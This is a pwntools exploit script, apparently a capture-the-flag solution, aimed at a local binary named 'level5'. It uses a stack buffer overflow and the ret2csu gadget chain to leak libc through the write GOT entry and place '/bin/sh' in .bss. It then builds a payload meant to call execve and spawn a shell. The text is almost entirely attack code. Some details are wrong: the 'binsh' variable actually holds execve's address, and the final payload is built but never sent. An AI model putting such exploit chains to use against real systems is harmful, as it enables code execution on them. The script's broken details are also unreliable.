from pwn import *
from LibcSearcher import *

p=process("./level5")
elf=ELF("./level5")
bss_base=elf.bss()

write_got=elf.got['write']
read_got=elf.got['read']
main_addr=elf.symbols['main']
csu_end_addr=0x40061A
csu_init_addr=0x400600

payload1='A'*0x88+p64(csu_end_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(write_got)+p64(1)+p64(csu_init_addr)+'A'*0x38+p64(main_addr)

p.recvuntil("World\n")
p.sendline(payload1)

write_addr=u64(p.recv(8))
libc=LibcSearcher('write',write_addr)
libcbase=write_addr-libc.dump('write')
binsh=libcbase+libc.dump('execve')

p.recvuntil("World\n")

payload2='A'*0x88+p64(csu_end_addr)+p64(0)+p64(1)+p64(read_got)+p64(16)+p64(bss_base)+p64(0)+p64(csu_init_addr)+'A'*0x38+p64(main_addr)

p.send(payload2)
p.sendline('/bin/sh')

p.recvuntil("World\n")
payload3='A'*0x88+p64(csu_end_addr)+p64(0)+p64(1)+p64(binsh)+p64(0)+p64(0)+p64(bss_base)+p64(csu_init_addr)+'A'*0x38+p64(main_addr)



